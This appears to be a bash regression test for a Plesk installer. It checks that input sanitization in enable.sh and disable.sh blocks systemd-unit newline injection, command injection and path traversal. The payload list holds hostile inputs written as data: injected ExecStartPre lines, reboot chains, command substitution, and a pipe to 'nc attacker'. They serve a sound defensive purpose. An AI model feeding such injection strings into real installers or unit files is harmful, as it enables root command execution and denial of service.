#!/usr/bin/env bash
# LOOK — Plesk installer injection-regression guard (NO NETWORK / does NOT NEED Plesk)
#
# What it protects: the privesc bug class — enable.sh writes the DOMAIN/SCRIPT/DOC_ROOT
# args into the systemd unit with an UNQUOTED heredoc; without sanitization an arg with an
# embedded line end injects its own directive (ExecStartPre=...) into the unit and
# runs a ROOT command via 'sudo systemctl restart'. disable.sh passes SVC_NAME to
# 'sudo systemctl stop' (arbitrary-service DoS + path-injection).
#
# This guard EXTRACTS FROM THE REAL SOURCE: it greps the 'tr -cd' whitelist
# and the case guards in enable.sh/disable.sh from the source. If someone weakens the sanitization
# (removing the tr line / widening the charset / deleting a case guard) the test goes RED.
#
# Run:  bash cpp/tests/_plesk_inject_test.sh
# CI-feasible: only bash + coreutils (tr/grep/sed). NO Plesk, network or root needed.

set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
ENABLE="$HERE/../../platforms/plesk/htdocs/scripts/enable.sh"
DISABLE="$HERE/../../platforms/plesk/htdocs/scripts/disable.sh"

FAIL=0
pass() { printf '  \033[32mPASS\033[0m %s\n' "$1"; }
fail() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; FAIL=1; }

[ -f "$ENABLE" ]  || { echo "enable.sh not found: $ENABLE"; exit 2; }
[ -f "$DISABLE" ] || { echo "disable.sh not found: $DISABLE"; exit 2; }

# --- EXTRACT the sanitization charset from the source (so the test stays tied to the source) ---
# Line pattern:  DOMAIN=$(printf '%s' "$DOMAIN" | tr -cd 'A-Za-z0-9.-')
extract_charset() { # <file> <varname>
    sed -n "s/^[[:space:]]*$2=\$(printf '%s' \"\$$2\" | tr -cd '\([^']*\)').*/\1/p" "$1" | head -1
}

DOMAIN_CS="$(extract_charset "$ENABLE" DOMAIN)"
SCRIPT_CS="$(extract_charset "$ENABLE" SCRIPT)"
DIS_SVC_CS="$(extract_charset "$DISABLE" SVC_NAME)"

echo "== 1) Are the sanitization lines PRESENT in the source (silent-removal guard) =="
[ -n "$DOMAIN_CS" ]  && pass "enable.sh DOMAIN tr -cd '$DOMAIN_CS'"   || fail "enable.sh DOMAIN tr -cd line MISSING (was sanitization removed?)"
[ -n "$SCRIPT_CS" ]  && pass "enable.sh SCRIPT tr -cd '$SCRIPT_CS'"   || fail "enable.sh SCRIPT tr -cd line MISSING"
[ -n "$DIS_SVC_CS" ] && pass "disable.sh SVC_NAME tr -cd '$DIS_SVC_CS'" || fail "disable.sh SVC_NAME tr -cd line MISSING"

# Real payloads containing a newline ("\n") — produced with printf.
PAYLOADS=(
  "look.com"                                   # clean (control)
  $'look.com\nExecStartPre=/bin/touch /tmp/pwn'  # LINE-END unit injection (the actual privesc)
  $'look.com\n[Service]\nExecStart=/bin/sh -c reboot'
  'look.com; touch /tmp/pwn'                   # command separator
  'look.com$(touch /tmp/pwn)'                  # command substitution
  'look.com`touch /tmp/pwn`'                   # backtick
  'look.com && reboot'                         # && chain
  'look.com | nc attacker 9'                   # pipe
  '../../etc/systemd/system/evil'              # traversal
  $'look.com\r\nExecStart=/evil'               # CRLF
)

# A value being SAFELY embeddable in a systemd-unit line: NO line end +
# NO metacharacters that would break the shell/unit. The tr whitelist guarantees this naturally.
has_dangerous() { # <string>  -> 0 (dangerous present), 1 (clean)
    printf '%s' "$1" | LC_ALL=C grep -q '[^A-Za-z0-9._/-]' && return 0
    case "$1" in *$'\n'*|*$'\r'*) return 0;; esac
    return 1
}

echo "== 2) Does the enable.sh DOMAIN sanitization KILL the injection =="
for p in "${PAYLOADS[@]}"; do
    clean="$(printf '%s' "$p" | tr -cd "$DOMAIN_CS")"
    # Rendered unit line: Description=LOOK FastCGI - <clean>  (must stay a single line)
    lines="$(printf 'Description=LOOK FastCGI - %s\n' "$clean" | wc -l | tr -d ' ')"
    label="$(printf '%s' "$p" | tr '\n\r' '__')"
    if has_dangerous "$clean"; then
        fail "DOMAIN cleaned value is still dangerous: [$clean]  <- [$label]"
    elif [ "$lines" != "1" ]; then
        fail "DOMAIN newline injection got through ($lines lines)  <- [$label]"
    else
        pass "DOMAIN neutralized: [$label] -> [$clean]"
    fi
done

echo "== 3) enable.sh SCRIPT: tr strips metacharacters + '..'/prefix case guards exist =="
# The SCRIPT charset includes '/' and '.' → '..' PASSES tr; an extra case-guard is required.
grep -Eq 'case[[:space:]]+"\$SCRIPT"[[:space:]]+in[[:space:]]+\*\.\.\*' "$ENABLE" \
    && pass "SCRIPT '..' traversal case guard present" \
    || fail "SCRIPT '..' traversal case guard MISSING (tr lets '..' through!)"
grep -q '/var/www/vhosts/' "$ENABLE" \
    && pass "SCRIPT /var/www/vhosts prefix enforcement present" \
    || fail "SCRIPT prefix enforcement MISSING"
for p in $'x\nExecStart=/evil' 'x;reboot' 'x$(id)' 'x`id`'; do
    clean="$(printf '%s' "$p" | tr -cd "$SCRIPT_CS")"
    label="$(printf '%s' "$p" | tr '\n\r' '__')"
    has_dangerous "$clean" && fail "SCRIPT dangerous value remained: [$clean] <- [$label]" \
                           || pass "SCRIPT metacharacter strip: [$label] -> [$clean]"
done

echo "== 4) disable.sh: SVC_NAME look-* enforcement + metacharacter strip =="
grep -Eq 'look-\*\)' "$DISABLE" \
    && pass "disable.sh look-* case guard present" \
    || fail "disable.sh look-* case guard MISSING (arbitrary systemctl stop!)"
for p in $'sshd\nreboot' 'look-x;rm' 'look-../../evil' 'mariadb'; do
    clean="$(printf '%s' "$p" | tr -cd "$DIS_SVC_CS")"
    label="$(printf '%s' "$p" | tr '\n\r' '__')"
    has_dangerous "$clean" && fail "SVC dangerous value remained: [$clean] <- [$label]" \
                           || pass "SVC metacharacter strip: [$label] -> [$clean]"
done

# --- POSITIVE CONTROL: REMOVE the sanitization → the privesc payload PASSES → the guard sees it ---
echo "== 5) POSITIVE CONTROL (the test would be red if sanitization were broken) =="
evil=$'look.com\nExecStartPre=/bin/touch /tmp/pwn'
raw_lines="$(printf 'Description=LOOK FastCGI - %s\n' "$evil" | wc -l | tr -d ' ')"
if has_dangerous "$evil" && [ "$raw_lines" -gt 1 ]; then
    pass "an unsanitized payload REALLY injects ($raw_lines lines) -> the guard discriminates"
else
    fail "positive control did not produce the expected injection — the test does NOT discriminate"
fi

echo
[ "$FAIL" = 0 ] && { echo "== ALL INJECTION GUARDS PASSED =="; exit 0; } \
               || { echo "== INJECTION GUARD FAILED =="; exit 1; }
